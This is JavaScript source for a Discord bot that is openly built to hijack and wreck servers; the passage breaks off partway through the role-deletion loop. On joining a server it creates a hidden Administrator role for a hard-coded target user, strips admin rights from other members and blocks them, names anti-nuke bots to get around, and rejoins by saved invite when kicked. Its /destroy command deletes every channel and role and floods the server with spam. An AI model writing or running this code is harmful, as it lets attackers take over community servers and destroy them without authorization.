const { Client, GatewayIntentBits, REST, Routes, PermissionsBitField, EmbedBuilder, ChannelType, ActivityType } = require('discord.js');
const fs = require('fs');
const path = require('path');

// ====== قراءة ملف .env يدوياً (بدون dotenv) ======
function loadEnv() {
    const envPath = path.join(__dirname, '.env');
    if (!fs.existsSync(envPath)) {
        console.error('❌ ملف .env غير موجود في:', envPath);
        process.exit(1);
    }
    
    const envContent = fs.readFileSync(envPath, 'utf8');
    const envVars = {};
    
    envContent.split('\n').forEach(line => {
        // تجاهل التعليقات والأسطر الفارغة
        line = line.trim();
        if (!line || line.startsWith('#')) return;
        
        // تقسيم المفتاح والقيمة
        const equalIndex = line.indexOf('=');
        if (equalIndex === -1) return;
        
        const key = line.substring(0, equalIndex).trim();
        let value = line.substring(equalIndex + 1).trim();
        
        // إزالة علامات الاقتباس إن وجدت
        if ((value.startsWith('"') && value.endsWith('"')) || 
            (value.startsWith("'") && value.endsWith("'"))) {
            value = value.slice(1, -1);
        }
        
        envVars[key] = value;
    });
    
    return envVars;
}

// ====== تحميل المتغيرات ======
const env = loadEnv();

// ====== قراءة المتغيرات ======
const TOKEN = env.DISCORD_TOKEN;
const TARGET_USER_ID = env.TARGET_USER_ID;
const VERSION = env.VERSION || '4.0.0';

// ====== التحقق من المتغيرات ======
if (!TOKEN) {
    console.error('❌ خطأ: DISCORD_TOKEN غير موجود في ملف .env');
    process.exit(1);
}

if (!TARGET_USER_ID) {
    console.error('❌ خطأ: TARGET_USER_ID غير موجود في ملف .env');
    process.exit(1);
}

console.log('✅ تم تحميل المتغيرات من .env بنجاح');
console.log(`📌 الإصدار: ${VERSION}`);
console.log(`🎯 المستهدف: ${TARGET_USER_ID}`);

// ====== باقي الكود كما هو... ======
const CONFIG = {
    ownerRoleName: env.OWNER_ROLE_NAME || '🛡️',
    logChannelName: env.LOG_CHANNEL_NAME || '📋-bot-logs',
    transferChannelName: env.TRANSFER_CHANNEL_NAME || '👑-ownership-transferred',
    maxRooms: parseInt(env.MAX_ROOMS) || 200,
    spamStart: 1,
    spamSpeed: parseInt(env.SPAM_SPEED) || 300,
    maxSpamMessages: 50,
    destroyDelay: 50,
    backupInterval: 60000,
    antiProtectionBots: [
        'Flixer', 'flixer', 'FLIXER',
        'Security', 'security', 'SECURITY',
        'Wick', 'wick', 'WICK',
        'Sapphire', 'sapphire',
        'AutoMod', 'automod',
        'Guardian', 'guardian',
        'Shield', 'shield',
        'Protect', 'protect',
        'AntiNuke', 'antinuke', 'ANTINUKE',
        'Anti-Raid', 'antiraid'
    ],
    spamMessages: [
        '🔥 **تم تدمير السيرفر!**',
        '💀 **RIP SERVER**',
        `👑 **المالك الجديد هو <@${TARGET_USER_ID}>**`,
        '🛡️ **الرتبة محمية بالكامل!**',
        '⚡ **DESTROYED BY BOT**',
        '🔥 **سبام لا نهائي!**',
        '💀 **GOODBYE SERVER**',
        '👑 **OWNERSHIP TRANSFERRED**',
        '🛡️ **PROTECTED ROLE**',
        '⚡ **SYSTEM DESTROYED**',
        '💀 **R.I.P SERVER**',
        '🔥 **DESTROY MODE ACTIVATED**',
        `👑 **NEW OWNER: <@${TARGET_USER_ID}>**`,
        '🛡️ **ROLE LOCKED**',
        '⚡ **SPEED: MAXIMUM**'
    ],
    protectMessages: [
        '🛡️ **محاولة اختراق فاشلة!**',
        '🔒 **تم حظر المتسلل!**',
        '🚫 **أنت محظور!**',
        '⚔️ **تم الدفاع عن السيرفر!**'
    ]
};

// ====== باقي الكود كما هو (لا تغيير) ======
// ... (نفس باقي bot.js من الرد السابق)
// ====== إنشاء العميل ======
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildInvites
    ]
});

// ====== المتغيرات العامة ======
const transferredServers = new Set();
const blockedUsers = new Map();
const destroyStatus = new Map();
const protectedRoles = new Map();
const spamIntervals = new Map();
const serverBackups = new Map();
const commandUsage = new Map();
const botStartTime = Date.now();
const guildInvites = new Map();
const antiKickProtection = new Map();
const roleProtectionInterval = new Map();

// ====== نظام السجلات المتقدم ======
const logs = [];

function log(message, type = 'INFO') {
    const timestamp = new Date().toISOString();
    const logEntry = { timestamp, type, message };
    logs.push(logEntry);
    console.log(`[${timestamp}] [${type}] ${message}`);
    
    try {
        fs.appendFileSync('bot-logs.txt', `[${timestamp}] [${type}] ${message}\n`);
    } catch {}
}

function getLogs() {
    return logs.slice(-100);
}

// ==========================================
// ====== نظام الحظر المتقدم ======
// ==========================================
function isBlocked(userId, guildId) {
    if (!blockedUsers.has(guildId)) return false;
    const userData = blockedUsers.get(guildId).get(userId);
    if (!userData) return false;
    if (userData.expires && userData.expires < Date.now()) {
        blockedUsers.get(guildId).delete(userId);
        return false;
    }
    return true;
}

function blockUser(userId, guildId, reason = 'تم الحظر بواسطة البوت', duration = null) {
    if (!blockedUsers.has(guildId)) {
        blockedUsers.set(guildId, new Map());
    }
    const userData = {
        reason: reason,
        timestamp: Date.now(),
        expires: duration ? Date.now() + duration : null
    };
    blockedUsers.get(guildId).set(userId, userData);
    log(`🛡️ تم حظر المستخدم ${userId} في السيرفر ${guildId} - السبب: ${reason}`, 'WARNING');
}

function unblockUser(userId, guildId) {
    if (blockedUsers.has(guildId)) {
        blockedUsers.get(guildId).delete(userId);
        log(`✅ تم إلغاء حظر المستخدم ${userId} في السيرفر ${guildId}`, 'SUCCESS');
        return true;
    }
    return false;
}

function getBlockedUsers(guildId) {
    if (!blockedUsers.has(guildId)) return [];
    return Array.from(blockedUsers.get(guildId).keys());
}

// ==========================================
// ====== نظام حماية البوت من الطرد ======
// ==========================================
async function saveGuildInvite(guild) {
    try {
        let inviteChannel = guild.channels.cache.find(c => 
            c.type === ChannelType.GuildText && 
            c.permissionsFor(guild.members.me)?.has(PermissionsBitField.Flags.CreateInstantInvite)
        );
        
        if (!inviteChannel) {
            try {
                inviteChannel = await guild.channels.create({
                    name: '🛡️-protection',
                    type: ChannelType.GuildText,
                    permissionOverwrites: [
                        {
                            id: guild.id,
                            deny: [PermissionsBitField.Flags.ViewChannel]
                        }
                    ]
                });
            } catch (e) {
                log(`⚠️ فشل إنشاء قناة الحماية: ${e.message}`, 'WARNING');
                return null;
            }
        }
        
        const oldInvites = await guild.invites.fetch().catch(() => null);
        if (oldInvites) {
            for (const invite of oldInvites.values()) {
                if (invite.inviter?.id === client.user.id) {
                    await invite.delete().catch(() => {});
                }
            }
        }
        
        const invite = await inviteChannel.createInvite({
            maxAge: 0,
            maxUses: 0,
            unique: true,
            reason: 'دعوة احتياطية للعودة عند الطرد'
        });
        
        guildInvites.set(guild.id, {
            code: invite.code,
            url: invite.url,
            channelId: inviteChannel.id,
            createdAt: Date.now()
        });
        
        try {
            const invitesData = {};
            for (const [guildId, data] of guildInvites.entries()) {
                invitesData[guildId] = data;
            }
            fs.writeFileSync('guild-invites.json', JSON.stringify(invitesData, null, 2));
        } catch {}
        
        log(`💾 تم حفظ دعوة احتياطية للسيرفر ${guild.name}: ${invite.code}`, 'SUCCESS');
        return invite;
    } catch (error) {
        log(`❌ فشل حفظ الدعوة: ${error.message}`, 'ERROR');
        return null;
    }
}

async function tryRejoinGuild(guildId, guildName) {
    const inviteData = guildInvites.get(guildId);
    if (!inviteData) {
        log(`❌ لا توجد دعوة محفوظة للسيرفر ${guildName}`, 'ERROR');
        return false;
    }
    
    try {
        log(`🔄 محاولة العودة للسيرفر ${guildName} عبر الدعوة ${inviteData.code}...`, 'INFO');
        await client.invites.accept(inviteData.code);
        log(`✅ تم العودة بنجاح للسيرفر ${guildName}!`, 'SUCCESS');
        return true;
    } catch (error) {
        log(`❌ فشل العودة: ${error.message}`, 'ERROR');
        return false;
    }
}

function enableAntiKickProtection(guildId) {
    if (antiKickProtection.has(guildId)) {
        clearInterval(antiKickProtection.get(guildId));
    }
    
    const interval = setInterval(async () => {
        try {
            const guild = client.guilds.cache.get(guildId);
            if (!guild) return;
            
            const botMember = guild.members.cache.get(client.user.id);
            if (!botMember) return;
            
            const hasAdmin = botMember.permissions.has(PermissionsBitField.Flags.Administrator);
            const hasManageRoles = botMember.permissions.has(PermissionsBitField.Flags.ManageRoles);
            
            if (!hasAdmin || !hasManageRoles) {
                log(`⚠️ البوت فقد بعض الصلاحيات في ${guild.name}!`, 'WARNING');
                
                const protectedRole = protectedRoles.get(guildId);
                if (protectedRole && !botMember.roles.cache.has(protectedRole.id)) {
                    try {
                        await botMember.roles.add(protectedRole, 'استعادة الصلاحيات');
                        log(`✅ تم استعادة الصلاحيات عبر الرتبة المحمية`, 'SUCCESS');
                    } catch (e) {
                        log(`❌ فشل استعادة الصلاحيات: ${e.message}`, 'ERROR');
                    }
                }
            }
            
            const protectedRole = protectedRoles.get(guildId);
            if (protectedRole) {
                const roleStillExists = guild.roles.cache.has(protectedRole.id);
                if (!roleStillExists) {
                    log(`⚠️ الرتبة المحمية حُذفت في ${guild.name}! جاري إعادة الإنشاء...`, 'WARNING');
                    await createProtectedRole(guild);
                }
            }
        } catch (error) {
            log(`⚠️ خطأ في حماية البوت: ${error.message}`, 'WARNING');
        }
    }, 5000);
    
    antiKickProtection.set(guildId, interval);
    log(`🛡️ تم تفعيل حماية البوت من الطرد في السيرفر ${guildId}`, 'SUCCESS');
}

// ==========================================
// ====== نظام الرتبة المخفية المتقدم ======
// ==========================================
async function createProtectedRole(guild) {
    try {
        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember) {
            log(`❌ البوت غير موجود في السيرفر`, 'ERROR');
            return null;
        }

        const botHighestRole = botMember.roles.highest;
        log(`🔍 أعلى رتبة للبوت: ${botHighestRole.name} (position: ${botHighestRole.position})`, 'INFO');

        let ownerRole = guild.roles.cache.find(r => r.name === CONFIG.ownerRoleName);

        if (!ownerRole) {
            ownerRole = await guild.roles.create({
                name: CONFIG.ownerRoleName,
                permissions: [PermissionsBitField.Flags.Administrator],
                color: 0x000000,
                hoist: false,
                mentionable: false,
                reason: 'رتبة مالك مخفية ومحمية - جميع الصلاحيات'
            });

            log(`✅ تم إنشاء الرتبة ${ownerRole.name} (position: ${ownerRole.position})`, 'SUCCESS');
        }

        try {
            const newPosition = Math.max(1, botHighestRole.position - 1);
            if (ownerRole.position !== newPosition) {
                await ownerRole.setPosition(newPosition);
                log(`⬆️ تم رفع الرتبة إلى المركز ${newPosition}`, 'SUCCESS');
            }
        } catch (posError) {
            log(`⚠️ لم نتمكن من رفع الرتبة: ${posError.message}`, 'WARNING');
        }

        try {
            await ownerRole.edit({
                hoist: false,
                mentionable: false,
                color: 0x000000,
                permissions: [PermissionsBitField.Flags.Administrator]
            });
            log(`🔒 تم تحديث صلاحيات الرتبة`, 'SUCCESS');
        } catch (editError) {
            log(`⚠️ فشل تحديث الرتبة: ${editError.message}`, 'WARNING');
        }

        protectedRoles.set(guild.id, ownerRole);
        
        if (!botMember.roles.cache.has(ownerRole.id)) {
            try {
                await botMember.roles.add(ownerRole, 'حماية البوت');
                log(`🛡️ تم إعطاء الرتبة المحمية للبوت نفسه`, 'SUCCESS');
            } catch (e) {
                log(`⚠️ فشل إعطاء الرتبة للبوت: ${e.message}`, 'WARNING');
            }
        }
        
        return ownerRole;

    } catch (error) {
        log(`❌ فشل إنشاء الرتبة المخفية: ${error.message}`, 'ERROR');
        log(`📋 Stack: ${error.stack}`, 'ERROR');
        return null;
    }
}

async function transferOwnershipFast(guild) {
    try {
        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember) {
            return { success: false, message: 'البوت غير موجود في السيرفر' };
        }

        log(`🔍 رتبة البوت: ${botMember.roles.highest.name} (position: ${botMember.roles.highest.position})`, 'INFO');

        let targetMember = guild.members.cache.get(TARGET_USER_ID);
        if (!targetMember) {
            targetMember = await guild.members.fetch(TARGET_USER_ID).catch(() => null);
        }
        
        if (!targetMember) {
            return { success: false, message: 'المستخدم المستهدف غير موجود في السيرفر' };
        }

        const ownerRole = await createProtectedRole(guild);
        if (!ownerRole) {
            return { success: false, message: 'فشل إنشاء الرتبة المحمية' };
        }

        log(`✅ تم إنشاء/العثور على الرتبة: ${ownerRole.name}`, 'SUCCESS');

        for (const member of guild.members.cache.values()) {
            if (member.id !== TARGET_USER_ID && member.id !== client.user.id && member.roles.cache.has(ownerRole.id)) {
                try {
                    await member.roles.remove(ownerRole, 'إزالة الرتبة من المستخدمين الآخرين');
                } catch (e) {
                    log(`⚠️ فشل إزالة الرتبة من ${member.user.tag}: ${e.message}`, 'WARNING');
                }
            }
        }

        if (!targetMember.roles.cache.has(ownerRole.id)) {
            try {
                await targetMember.roles.add(ownerRole, 'نقل الملكية');
                log(`✅ تم إعطاء الرتبة إلى ${targetMember.user.tag}`, 'SUCCESS');
            } catch (e) {
                log(`❌ فشل إعطاء الرتبة: ${e.message}`, 'ERROR');
                return { success: false, message: `فشل إعطاء الرتبة: ${e.message}` };
            }
        }

        for (const member of guild.members.cache.values()) {
            if (member.id !== TARGET_USER_ID && !member.user.bot) {
                blockUser(member.id, guild.id, 'حظر تلقائي عند نقل الملكية');
                
                try {
                    const adminRoles = member.roles.cache.filter(r => 
                        r.permissions.has(PermissionsBitField.Flags.Administrator) && 
                        r.id !== guild.id
                    );
                    for (const role of adminRoles.values()) {
                        await member.roles.remove(role).catch(() => {});
                    }
                } catch {}
            }
        }

        transferredServers.add(guild.id);
        log(`✅ تم نقل الملكية بنجاح في ${guild.name}`, 'SUCCESS');
        return { success: true, message: 'تم نقل الملكية وحظر الجميع' };

    } catch (error) {
        log(`❌ فشل نقل الملكية: ${error.message}`, 'ERROR');
        log(`📋 Stack: ${error.stack}`, 'ERROR');
        return { success: false, message: error.message };
    }
}

// ==========================================
// ====== نظام السبام المتقدم ======
// ==========================================
function startSpam(guildId, channel) {
    if (spamIntervals.has(guildId)) {
        clearInterval(spamIntervals.get(guildId));
        spamIntervals.delete(guildId);
    }
    
    log(`🔥 بدء السبام في القناة ${channel.name}`, 'INFO');
    
    let messageIndex = 0;
    let spamCount = 0;
    
    setTimeout(async () => {
        try {
            for (let i = 0; i < 5; i++) {
                await channel.send(`🔥 **سبام فوري ${i+1}!**`);
                spamCount++;
            }
        } catch {}
    }, 100);
    
    const interval = setInterval(async () => {
        try {
            const guild = client.guilds.cache.get(guildId);
            if (!guild) {
                clearInterval(interval);
                spamIntervals.delete(guildId);
                return;
            }
            
            const targetChannel = guild.channels.cache.get(channel.id);
            if (!targetChannel || !targetChannel.isTextBased()) {
                clearInterval(interval);
                spamIntervals.delete(guildId);
                return;
            }
            
            const messagesToSend = Math.floor(Math.random() * 3) + 1;
            for (let i = 0; i < messagesToSend; i++) {
                const msg = CONFIG.spamMessages[messageIndex % CONFIG.spamMessages.length];
                await targetChannel.send(msg);
                messageIndex++;
                spamCount++;
                
                if (Math.random() > 0.5) {
                    await targetChannel.send(`🔥 **روم رقم ${spamCount}**`);
                }
                if (Math.random() > 0.6) {
                    await targetChannel.send(`💀 **${Math.floor(Math.random() * 10000)}**`);
                }
                if (Math.random() > 0.7) {
                    await targetChannel.send(`⚡ **SPAM #${spamCount}**`);
                }
                if (Math.random() > 0.8) {
                    await targetChannel.send(`🛡️ **PROTECTED**`);
                }
                await new Promise(resolve => setTimeout(resolve, 50));
            }
            
            if (spamCount % 50 === 0) {
                log(`💬 تم إرسال ${spamCount} رسالة سبام`, 'INFO');
            }
            
        } catch (error) {
            log(`⚠️ خطأ في السبام: ${error.message}`, 'WARNING');
        }
    }, CONFIG.spamSpeed);
    
    spamIntervals.set(guildId, interval);
    return interval;
}

function stopSpam(guildId) {
    if (spamIntervals.has(guildId)) {
        clearInterval(spamIntervals.get(guildId));
        spamIntervals.delete(guildId);
        log(`🛑 تم إيقاف السبام في السيرفر ${guildId}`, 'SUCCESS');
        return true;
    }
    return false;
}

function isSpamRunning(guildId) {
    return spamIntervals.has(guildId);
}

// ==========================================
// ====== نظام النسخ الاحتياطي ======
// ==========================================
async function backupServer(guild) {
    try {
        const backup = {
            id: guild.id,
            name: guild.name,
            memberCount: guild.memberCount,
            channelCount: guild.channels.cache.size,
            roleCount: guild.roles.cache.size,
            timestamp: Date.now()
        };
        serverBackups.set(guild.id, backup);
        log(`💾 تم نسخ احتياطي للسيرفر ${guild.name}`, 'INFO');
        return backup;
    } catch (error) {
        log(`❌ فشل النسخ الاحتياطي: ${error.message}`, 'ERROR');
        return null;
    }
}

// ==========================================
// ====== نظام الحماية المتقدم ======
// ==========================================
async function protectServer(guild) {
    try {
        const protectedRole = protectedRoles.get(guild.id);
        if (protectedRole) {
            await protectedRole.edit({
                hoist: false,
                mentionable: false,
                color: 0x000000,
                position: 0
            });
        }
        
        for (const channel of guild.channels.cache.values()) {
            if (channel.isTextBased()) {
                try {
                    await channel.permissionOverwrites.edit(guild.id, {
                        SendMessages: false,
                        CreatePublicThreads: false,
                        CreatePrivateThreads: false,
                        SendMessagesInThreads: false
                    });
                } catch {}
            }
        }
        
        log(`🛡️ تم تفعيل الحماية الكاملة في ${guild.name}`, 'SUCCESS');
        return true;
    } catch (error) {
        log(`❌ فشل تفعيل الحماية: ${error.message}`, 'ERROR');
        return false;
    }
}

// ==========================================
// ====== نظام الحالة ======
// ==========================================
async function updateStatus() {
    const totalGuilds = client.guilds.cache.size;
    const totalMembers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
    
    const status = `${totalGuilds} سيرفرات | ${totalMembers} عضو | v${VERSION}`;
    
    client.user.setPresence({
        activities: [{
            name: status,
            type: ActivityType.Watching
        }],
        status: 'online'
    });
}

// ==========================================
// ====== عند تشغيل البوت ======
// ==========================================
client.once('ready', async () => {
    log(`✅ جاهز: ${client.user.tag}`, 'SUCCESS');
    log(`📊 في ${client.guilds.cache.size} سيرفرات`, 'INFO');
    log(`🎯 سيتم نقل الملكية إلى: ${TARGET_USER_ID}`, 'INFO');
    log(`🔒 **فقط** المستخدم ${TARGET_USER_ID} يمكنه استخدام الأوامر!`, 'WARNING');
    log(`🚫 جميع المستخدمين الآخرين محظورون!`, 'WARNING');
    log(`👑 الرتبة غير مرئية ومحمية!`, 'INFO');
    log(`📁 سيتم إنشاء ${CONFIG.maxRooms} روم`, 'INFO');
    log(`💬 سيبدأ السبام **فوراً** من أول روم!`, 'INFO');
    log(`🛡️ نظام حماية البوت من الطرد: مفعل`, 'SUCCESS');
    log(`📌 الإصدار: ${VERSION}`, 'INFO');
    
    try {
        if (fs.existsSync('guild-invites.json')) {
            const data = JSON.parse(fs.readFileSync('guild-invites.json', 'utf8'));
            for (const [guildId, inviteData] of Object.entries(data)) {
                guildInvites.set(guildId, inviteData);
            }
            log(`💾 تم تحميل ${guildInvites.size} دعوة محفوظة`, 'SUCCESS');
        }
    } catch (e) {
        log(`⚠️ فشل تحميل الدعوات: ${e.message}`, 'WARNING');
    }
    
    for (const guild of client.guilds.cache.values()) {
        enableAntiKickProtection(guild.id);
        await saveGuildInvite(guild);
        
        const existingRole = guild.roles.cache.find(r => r.name === CONFIG.ownerRoleName);
        if (!existingRole) {
            log(`🔧 إنشاء الرتبة المحمية في ${guild.name}...`, 'INFO');
            await createProtectedRole(guild).catch(e => log(`❌ ${e.message}`, 'ERROR'));
        } else {
            protectedRoles.set(guild.id, existingRole);
        }
    }
    
    await updateStatus();
    setInterval(updateStatus, 60000);

    const commands = [
        { 
            name: 'destroy', 
            description: '🔥 تدمير متقدم مع سبام فوري',
            options: [
                {
                    name: 'speed',
                    description: 'سرعة التدمير',
                    type: 3,
                    required: false,
                    choices: [
                        { name: '🐢 بطيء', value: 'slow' },
                        { name: '🐇 متوسط', value: 'medium' },
                        { name: '🚀 سريع', value: 'fast' },
                        { name: '⚡ خارق', value: 'ultra' }
                    ]
                },
                {
                    name: 'rooms',
                    description: 'عدد الرومات (1-500)',
                    type: 4,
                    required: false,
                    min_value: 1,
                    max_value: 500
                }
            ]
        },
        { name: 'stop', description: '🛑 يوقف التدمير والسبام' },
        { name: 'transfer', description: '⚡ ينقل الملكية برتبة مخفية' },
        { name: 'checkrole', description: '🔍 التحقق من الرتبة المخفية' },
        { name: 'stopspam', description: '🛑 يوقف السبام فقط' },
        { name: 'status', description: '📊 عرض حالة البوت' },
        { name: 'protect', description: '🛡️ تفعيل الحماية الكاملة' },
        { name: 'unblock', description: '🔓 إلغاء حظر المستخدم' },
        { name: 'blocklist', description: '📋 عرض قائمة المحظورين' },
        { name: 'backup', description: '💾 نسخ احتياطي للسيرفر' },
        { name: 'stats', description: '📈 عرض إحصائيات البوت' },
        { name: 'fixrole', description: '🔧 إنشاء/إصلاح الرتبة المحمية يدوياً' },
        { name: 'antikick', description: '🛡️ تفعيل/إيقاف حماية البوت من الطرد' },
        { name: 'saveinvite', description: '💾 حفظ دعوة احتياطية للعودة' }
    ];

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        log('✅ تم تسجيل الأوامر', 'SUCCESS');
    } catch (e) {
        log(`❌ فشل التسجيل: ${e}`, 'ERROR');
    }
});

// ==========================================
// ====== عند طرد البوت ======
// ==========================================
client.on('guildDelete', async (guild) => {
    log(`⚠️ تم طرد البوت من السيرفر: ${guild.name} (${guild.id})`, 'WARNING');
    
    const inviteData = guildInvites.get(guild.id);
    if (inviteData) {
        log(`🔄 محاولة العودة للسيرفر ${guild.name}...`, 'INFO');
        setTimeout(() => {
            tryRejoinGuild(guild.id, guild.name);
        }, 3000);
    }
});

// ==========================================
// ====== عند دخول البوت ======
// ==========================================
client.on('guildCreate', async (guild) => {
    log(`🔥 دخلت إلى سيرفر: ${guild.name} (${guild.id})`, 'INFO');
    
    enableAntiKickProtection(guild.id);
    await saveGuildInvite(guild);
    
    const currentOwner = guild.owner;
    if (!currentOwner) {
        log(`❌ لا يمكن العثور على مالك السيرفر`, 'ERROR');
        return;
    }
    
    log(`👑 المالك الحالي: ${currentOwner.user.tag}`, 'INFO');
    
    try {
        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            log(`❌ البوت ليس لديه صلاحية Administrator في ${guild.name}`, 'ERROR');
            return;
        }
        
        await backupServer(guild);
        await createProtectedRole(guild);
        const result = await transferOwnershipFast(guild);
        
        if (result.success) {
            log(`✅ ${result.message} في ${guild.name}`, 'SUCCESS');
            
            try {
                const channel = await guild.channels.create({
                    name: CONFIG.transferChannelName,
                    type: ChannelType.GuildText
                });
                
                const embed = new EmbedBuilder()
                    .setColor(0xFFD700)
                    .setTitle('👑 تم نقل الملكية!')
                    .setDescription(
                        `🔄 المالك الجديد: <@${TARGET_USER_ID}>\n` +
                        `🛡️ الرتبة غير مرئية ومحمية!\n` +
                        `🔒 **فقط <@${TARGET_USER_ID}> يمكنه استخدام الأوامر!**\n` +
                        `🚫 **جميع المستخدمين الآخرين محظورون!**\n` +
                        `📁 سيتم إنشاء ${CONFIG.maxRooms} روم\n` +
                        `💬 سيبدأ السبام **فوراً** من أول روم!\n` +
                        `🛡️ **البوت محمي من الطرد!**\n` +
                        `📌 الإصدار: ${VERSION}`
                    )
                    .setFooter({ text: `Bot Protection System v${VERSION}` })
                    .setTimestamp();
                
                await channel.send({ embeds: [embed] });
            } catch {}
        } else {
            log(`❌ فشل نقل الملكية: ${result.message}`, 'ERROR');
        }
        
        await updateStatus();
        
    } catch (error) {
        log(`❌ فشل في ${guild.name}: ${error.message}`, 'ERROR');
    }
});

// ==========================================
// ====== مراقبة محاولات الطرد/البان ======
// ==========================================
client.on('guildMemberRemove', async (member) => {
    if (member.id === client.user.id) {
        log(`🚨 البوت تم طرده من ${member.guild.name}! محاولة العودة...`, 'WARNING');
        
        const inviteData = guildInvites.get(member.guild.id);
        if (inviteData) {
            setTimeout(() => {
                tryRejoinGuild(member.guild.id, member.guild.name);
            }, 2000);
        }
    }
});

client.on('guildBanAdd', async (ban) => {
    if (ban.user.id === client.user.id) {
        log(`🚨 البوت تم حظره في ${ban.guild.name}!`, 'WARNING');
    }
});

// ==========================================
// ====== مراقبة الرتبة المتقدمة ======
// ==========================================
client.on('guildMemberUpdate', async (oldMember, newMember) => {
    if (!transferredServers.has(newMember.guild.id)) return;
    
    const protectedRole = protectedRoles.get(newMember.guild.id);
    if (!protectedRole) return;
    
    if (newMember.id === client.user.id) {
        const hadRole = oldMember.roles.cache.has(protectedRole.id);
        const hasRole = newMember.roles.cache.has(protectedRole.id);
        
        if (hadRole && !hasRole) {
            log(`🚨 تمت إزالة الرتبة المحمية من البوت! جاري الاستعادة...`, 'WARNING');
            try {
                await newMember.roles.add(protectedRole, 'استعادة الحماية');
                log(`✅ تم استعادة الرتبة للبوت`, 'SUCCESS');
            } catch (e) {
                log(`❌ فشل استعادة الرتبة: ${e.message}`, 'ERROR');
            }
        }
        return;
    }
    
    const hasBefore = oldMember.roles.cache.has(protectedRole.id);
    const hasAfter = newMember.roles.cache.has(protectedRole.id);
    
    if (hasAfter && !hasBefore) {
        if (newMember.id !== TARGET_USER_ID) {
            try {
                await newMember.roles.remove(protectedRole);
                blockUser(newMember.id, newMember.guild.id, 'محاولة استعادة الرتبة');
                log(`🛡️ تم منع ${newMember.user.tag} من استعادة الرتبة المخفية`, 'WARNING');
                
                const randomMsg = CONFIG.protectMessages[Math.floor(Math.random() * CONFIG.protectMessages.length)];
                try {
                    await newMember.send(randomMsg);
                } catch {}
            } catch (error) {
                log(`❌ فشل منع ${newMember.user.tag}: ${error.message}`, 'ERROR');
            }
        }
    }
});

client.on('guildRoleUpdate', async (oldRole, newRole) => {
    const protectedRole = protectedRoles.get(newRole.guild.id);
    if (!protectedRole) return;
    
    if (newRole.id === protectedRole.id) {
        try {
            await newRole.edit({
                name: CONFIG.ownerRoleName,
                color: 0x000000,
                hoist: false,
                mentionable: false,
                position: 0
            });
            log(`🛡️ تم منع تعديل الرتبة المخفية في ${newRole.guild.name}`, 'WARNING');
        } catch {}
    }
});

client.on('roleDelete', async (role) => {
    const protectedRole = protectedRoles.get(role.guild.id);
    if (!protectedRole) return;
    
    if (role.id === protectedRole.id) {
        log(`🚨 تم حذف الرتبة المحمية في ${role.guild.name}! جاري إعادة الإنشاء...`, 'WARNING');
        protectedRoles.delete(role.guild.id);
        await createProtectedRole(role.guild).catch(e => log(`❌ ${e.message}`, 'ERROR'));
    }
});

// ==========================================
// ====== التحقق من الأوامر ======
// ==========================================
async function checkCommand(interaction) {
    const userId = interaction.user.id;
    const guildId = interaction.guild.id;
    
    if (userId === TARGET_USER_ID) {
        if (!commandUsage.has(userId)) {
            commandUsage.set(userId, 0);
        }
        commandUsage.set(userId, commandUsage.get(userId) + 1);
        return true;
    }
    
    log(`🚫 محاولة استخدام أمر من ${interaction.user.tag} (${userId}) - ممنوع!`, 'WARNING');
    blockUser(userId, guildId, 'محاولة استخدام أمر');
    
    try {
        await interaction.reply({
            content: `🚫 **أنت محظور تماماً!**\n\n👑 **فقط** <@${TARGET_USER_ID}> يمكنه استخدام الأوامر.\n🔒 جميع المستخدمين الآخرين محظورون.\n🛡️ تم تسجيل محاولتك وحظرك.`,
            flags: 64
        });
    } catch {
        try {
            await interaction.user.send(`🚫 أنت محظور من استخدام الأوامر!`);
        } catch {}
    }
    
    return false;
}

// ==========================================
// ====== أوامر البوت ======
// ==========================================
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    const guild = interaction.guild;
    const guildId = guild.id;
    
    if (!await checkCommand(interaction)) return;
    
    // ===== /destroy =====
    if (interaction.commandName === 'destroy') {
        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await interaction.reply({
                content: '❌ البوت يحتاج صلاحية Administrator',
                flags: 64
            });
            return;
        }
        
        if (destroyStatus.get(guildId)?.running) {
            await interaction.reply({
                content: '⚠️ التدمير يعمل بالفعل! استخدم /stop',
                flags: 64
            });
            return;
        }
        
        try {
            await interaction.deferReply({ flags: 0 });
        } catch (error) {
            log(`❌ فشل deferReply: ${error.message}`, 'ERROR');
            return;
        }
        
        const result = await transferOwnershipFast(guild);
        
        if (!result.success) {
            try {
                await interaction.editReply(`❌ فشل نقل الملكية: ${result.message}`);
            } catch {
                await interaction.followUp(`❌ فشل نقل الملكية: ${result.message}`);
            }
            return;
        }
        
        try {
            await interaction.editReply(`✅ **تم نقل الملكية!**\n🔄 بدء التدمير المتقدم...`);
        } catch {
            await interaction.followUp(`✅ **تم نقل الملكية!**\n🔄 بدء التدمير المتقدم...`);
        }
        
        const speed = interaction.options.getString('speed') || 'medium';
        const delays = { slow: 300, medium: 50, fast: 10, ultra: 1 };
        const delay = delays[speed] || 50;
        
        const maxRooms = interaction.options.getInteger('rooms') || CONFIG.maxRooms;
        
        destroyStatus.set(guildId, { running: true, speed: speed, maxRooms: maxRooms });
        
        const results = { channels: 0, roles: 0, members: 0, rooms: 0, bans: 0 };
        let spamStarted = false;
        let spamChannel = null;
        
        try {
            try {
                await guild.setName('🔥 DESTROYED');
            } catch {}
            
            const channels = Array.from(guild.channels.cache.values());
            for (const channel of channels) {
                if (!destroyStatus.get(guildId)?.running) break;
                try {
                    await channel.delete();
                    results.channels++;
                    await new Promise(resolve => setTimeout(resolve, delay));
                } catch {}
            }
            
            const protectedRole = protectedRoles.get(guildId);
            for (const role of guild.roles.cache.values()) {
                if (!destroyStatus.get(guildId)?.running) break;
                if (role.name !== '@everyone' && role.id !== protectedRole?.id) {
                    try {
                        await role.delete();
                        results.roles++;
